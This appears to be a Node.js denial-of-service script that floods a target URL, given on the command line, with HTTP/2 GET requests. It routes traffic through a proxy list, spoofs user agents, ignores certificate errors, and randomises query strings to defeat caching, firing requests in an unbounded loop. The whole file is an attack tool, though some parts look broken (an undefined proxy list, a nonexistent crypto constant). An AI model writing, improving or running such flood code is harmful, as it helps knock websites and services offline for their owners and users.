const { exec } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
const fakeua = require('fake-useragent');
tls.DEFAULT_ECDH_CURVE;

const objetive = process.argv[2];
const parsed = url.parse(objetive);
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
const SignalsList = sigalgs.join(':');

class TlsBuilder {
    constructor(socket) {
        this.curve = "GREASE:X25519:x25519";
        this.sigalgs = SignalsList;
        this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom;
    }
    
    async http2TUNNEL(socket) {
        const uas = fakeua();
        socket.setKeepAlive(true, 1000);
        socket.setTimeout(10000);
        
        let payload = {
            ":method": "GET",
            "Referer": objetive,
            "User-agent": uas,
            "Cache-Control": 'no-cache, no-store, private, max-age=0, must-revalidate',
            "Pragma": 'no-cache, no-store, private, max-age=0, must-revalidate',
            'client-control': 'max-age=43200, s-max-age=43200',
            'Upgrade-Insecure-Requests': 1,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
            ":path": parsed.path + "?" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        };
        
        const tunnel = http2.connect(parsed.href, {
            createConnection: () => tls.connect({
                socket: socket,
                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256" + ":HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:" + 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                host: parsed.host,
                servername: parsed.host,
                secure: true,
                honorCipherOrder: true,
                requestCert: true,
                secureOptions: this.Opt,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
            }, () => {
                setInterval(async () => {
                    await tunnel.request(payload).close();
                });
            })
        });
    }
}

const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity });

async function checkProxy(proxy) {
    return new Promise((resolve, reject) => {
        proxy = proxy.split(':');
        const req = http.get({
            host: proxy[0],
            port: proxy[1],
            timeout: 10000,
            agent: keepAliveAgent,
            path: parsed.host + ":443"
        });
        
        req.end();
        
        req.on('connect', (_, socket) => {
            resolve(socket);
            req.close();
        });
        
        req.on('error', (err) => {
            reject(err);
            req.close();
        });
    });
}

async function runWithValidProxy() {
    let validProxy = null;
    
    while (!validProxy) {
        const proxy = proxies.shift(); // Take the first proxy from the list
        if (!proxy) {
            console.log('No more proxies available. Exiting.');
            process.exit();
        }
        
        try {
            validProxy = await checkProxy(proxy);
        } catch (err) {
            console.error(`Proxy ${proxy} is not working, trying another one...`);
        }
    }
    
    const tlsBuilder = new TlsBuilder();
    tlsBuilder.http2TUNNEL(validProxy);
}

function scheduleProxyCheck() {
    const interval = setInterval(async () => {
        if (!proxies.length) {
            console.log('No more proxies available. Exiting.');
            clearInterval(interval);
            process.exit();
        }
        
        await runWithValidProxy();
    }, 5000);
}

scheduleProxyCheck();

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
    process.exit(1);
});
